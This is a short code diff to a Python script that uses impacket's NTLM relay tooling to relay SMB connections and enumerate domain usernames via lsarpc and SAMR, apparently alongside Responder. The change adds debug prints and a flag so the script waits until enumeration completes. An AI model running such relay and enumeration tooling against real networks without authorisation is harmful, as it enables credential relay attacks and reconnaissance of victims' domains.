@@ -18,6 +18,7 @@ from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbconnection import SMBConnection
 
 getting_usernames = False
+got_usernames = False
 
 
 class SMBAttack(Thread):
@@ -32,9 +33,13 @@ class SMBAttack(Thread):
 
     def run(self):
         global getting_usernames
+        global got_usernames
+        print "1 getting_usernames: " + str(getting_usernames)
         if getting_usernames:
+            print "2 getting_usernames: " + str(getting_usernames)
             return
         getting_usernames = True
+        print "3 getting_usernames: " + str(getting_usernames)
         rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
                                               smb_connection=self.__SMBConnection)
         dce = rpctransport.get_dce_rpc()
@@ -110,6 +115,8 @@ class SMBAttack(Thread):
         if in_domain:
             # Only works if we are relaying to a domain member
             SAMRDump().dump(self.__SMBConnection)
+
+        got_usernames = True
 
 
 class SAMRDump:
@@ -348,7 +355,7 @@ if __name__ == '__main__':
     print ""
     logging.info("Servers started, waiting for connections")
     try:
-        while not getting_usernames:
+        while not got_usernames:
             sleep(1)
     except KeyboardInterrupt:
         logging.info("Exiting... Remember to stop Responder if you need to")
